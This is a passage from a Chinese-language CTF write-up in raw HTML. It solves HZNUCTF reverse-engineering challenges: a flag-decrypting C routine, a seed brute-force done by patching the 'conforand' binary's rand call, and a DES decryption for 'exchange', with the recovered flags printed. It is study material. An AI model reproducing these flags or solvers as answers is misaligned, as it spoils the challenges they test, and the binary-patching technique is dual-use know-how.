number\">0x00</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// First: 0101001001100101010101100110010101010010011001010101001101100101</span>\n    <span class=\"token function\">srand</span><span class=\"token punctuation\">(</span><span class=\"token number\">2025</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> RdList<span class=\"token punctuation\">[</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">bool</span> v16 <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> rd<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">do</span>\n        <span class=\"token punctuation\">&#123;</span>\n            rd <span class=\"token operator\">=</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span>\n            rd <span class=\"token operator\">&amp;=</span> <span class=\"token number\">0x8000001F</span><span class=\"token punctuation\">;</span>\n            v16 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> i<span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>RdList<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> rd<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#123;</span>\n                    v16 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>v16<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        RdList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> rd<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">char</span> Key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"ReVeReSe\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> count <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>EncFlag <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">^=</span> Key<span class=\"token punctuation\">[</span>count <span class=\"token operator\">%</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        count<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> Buffer_Dec<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">Enc3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>inv<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>EncFlag<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>Buffer_Dec<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">Dec2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>Buffer_Dec<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>Buffer_Dec<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">Enc1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>Buffer_Dec<span class=\"token punctuation\">,</span> RdList<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"HZNUCTF&#123;%.64s&#125;\\n\"</span><span class=\"token punctuation\">,</span> Buffer_Dec<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>HZNUCTF{3zfb899ac5c256d-7a8r59f0tccd-4fa6b8vfd111-a44ffy4r0-6dce5679da58}</p>\n<h3 id=\"conforand（非预期）\"><a href=\"#conforand（非预期）\" class=\"headerlink\" title=\"conforand（非预期）\"></a>conforand（非预期）</h3><p>从srand查看交叉调用，发现是当前时间戳随机，并非伪随机。</p>\n<p><img src=\"/images/1744633170178-18.png\" alt=\"img\"></p>\n<p><img src=\"/images/1744633170178-19.png\" alt=\"img\"></p>\n<p>查看rand交叉调用，发现是再init_sbox函数中调用，并且只获取了一次随机数，应该是利用rand的数值参与sbox生成。</p>\n<p><img src=\"/images/1744633170178-20.png\" alt=\"img\"></p>\n<p>那么这边的思路就是爆破随机数，但由于是ollvm编译的，代码混乱，使用d810去混淆后也是很混乱，这边就直接不分析加密代码，采取黑盒爆破手段。</p>\n<p>接下来是先检验加密对称性，运行发现是会输出加密后的内容。</p>\n<p>检验步骤：</p>\n<ol>\n<li>随便输入一串字符串</li>\n<li>断点rand，修改rand返回值rax寄存器为0。</li>\n<li>得到输出加密内容。</li>\n<li>再次输入字符串，断点在main的rc4调用处，将传参的字符串patch为刚刚程序输出的加密后字节数据。</li>\n<li>断点rand，修改rand返回值rax寄存器为0。</li>\n<li>观察输出加密内容是否为原字符串数据。</li>\n</ol>\n<p>Patch前：</p>\n<p><img src=\"/images/1744633170178-21.png\" alt=\"img\"></p>\n<p>Patch后：</p>\n<p><img src=\"/images/1744633170178-22.png\" alt=\"img\"></p>\n<p>发现是对称的，同一个rand值，加密函数也可以用于解密。</p>\n<p><img src=\"/images/1744633170178-23.png\" alt=\"img\"></p>\n<p><img src=\"/images/1744633170178-24.png\" alt=\"img\"></p>\n<p>开始Patch原程序流程，用于爆破，将init函数作为hook跳转函数。</p>\n<p>将rand调用改成jmp到init函数。</p>\n<p><img src=\"/images/1744633170178-25.png\" alt=\"img\"></p>\n<p>init函数头直接改成如下，将0x4068D3地址的数值存到eax，然后再跳转回去，达到一个hook修改rand值结果的效果，所以我们直接加载elf通过修改0x4068D3数值，调用rc4加密来爆破解密密文。</p>\n<p><img src=\"/images/1744633170178-26.png\" alt=\"img\"></p>\n<p>这边使用这个库加载elf进行调用call：<a href=\"https://github.com/IchildYu/load-elf\">https://github.com/IchildYu/load-elf</a> （河豚鱼，神）</p>\n<p>爆破代码（Key是在原init函数中进行初始化的明文，可以直接找到）：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"include/load_elf.h\"</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"include/logger.h\"</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"include/breakpoint.h\"</span></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> path <span class=\"token operator\">=</span> <span class=\"token string\">\"./conforand\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">void</span><span class=\"token operator\">*</span> base <span class=\"token operator\">=</span> <span class=\"token function\">load_elf</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">__uint64_t</span>  <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>rc4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_symbol_by_offset</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">,</span><span class=\"token number\">0x413170</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">\"JustDoIt!\"</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span><span class=\"token number\">1000000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> EncData<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x83</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x9c</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xfa</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xe8</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xd5</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x0a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf6</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xa7</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x0f</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xfd</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xdd</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xd4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x3c</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xa7</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xed</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x8d</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x51</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xce</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x9e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x57</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x83</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xe7</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x9a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xcd</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x2f</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n                <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x4068D3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n\n                <span class=\"token function\">rc4</span><span class=\"token punctuation\">(</span>EncData<span class=\"token punctuation\">,</span><span class=\"token number\">42</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">,</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                \n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>EncData<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'H'</span> \n                        <span class=\"token operator\">&amp;&amp;</span> EncData<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'Z'</span>\n                        <span class=\"token operator\">&amp;&amp;</span> EncData<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'N'</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Seed:%d\\n\"</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.42s\\n\"</span><span class=\"token punctuation\">,</span>EncData<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p><img src=\"/images/1744633170178-27.png\" alt=\"img\"></p>\n<p>HZNUCTF{489b88-1305-411e-b1f4-88a3070a73}</p>\n<h3 id=\"exchange\"><a href=\"#exchange\" class=\"headerlink\" title=\"exchange\"></a>exchange</h3><p>输入的字符串经过unhex、拆分字节，改变顺序。</p>\n<p>如：<strong>11</strong>-&gt;<strong>0x31 0x31</strong>-&gt;<strong>‘3’ ‘1’ ‘3’ ‘1’</strong>-&gt;<strong>‘3’ ‘3’ ‘1’ ‘1’</strong></p>\n<p>是两个字节为一组进行变换的。</p>\n<p>然后调用了加密函数，第一个参数传入变换后的输入，第二个参数是**”HZNUCTF{“**字串。</p>\n<p><img src=\"/images/1744633170178-28.png\" alt=\"img\"></p>\n<p>主加密函数，发现只走这上面的部分。</p>\n<p><img src=\"/images/1744633170178-29.png\" alt=\"img\"></p>\n<p>第一个函数是用**”HZNUCTF{“**字串生成的一串数据，64个整数数据。</p>\n<p>第二个函数是将输入数据8个字节为一组进行加密。</p>\n<p>加密流程：</p>\n<ol>\n<li>4个字节为一组进行翻转</li>\n<li>8字节加密</li>\n<li>4个字节为一组进行翻转</li>\n</ol>\n<p><img src=\"/images/1744633170178-30.png\" alt=\"img\"></p>\n<p>加密可以看出是DES加密算法，是对称的，key就是刚刚生成的64个整数数值的前32个，那么可以知道后32个就是解密用的key，直接copy该函数，解密时用生成的后32个整数key即可解密。</p>\n<p><img src=\"/images/1744633170178-31.png\" alt=\"img\"></p>\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;time.h></span></span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> s1<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x01010400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000004</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000404</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00010004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00010000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000400</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x01010004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010404</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x01010404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010400</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000404</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01000400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01010004</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> s2<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x80108020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80008000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00008000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00108020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80100020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80008020</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x80000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80108020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80108000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80008000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80100020</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00108000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00100020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80008020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00008000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00108020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80100000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00100020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00108000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00008020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80108000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00008020</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00108020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80100020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80008020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80108000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00008000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x80100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80008000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80108020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00108020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00008000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00008020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80108000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00100020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80008020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00100020</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00108000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80008000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00008020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80100020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80108020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00108000</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> s3<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x00000208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000200</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00020008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08020208</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020008</span><span class=\"token 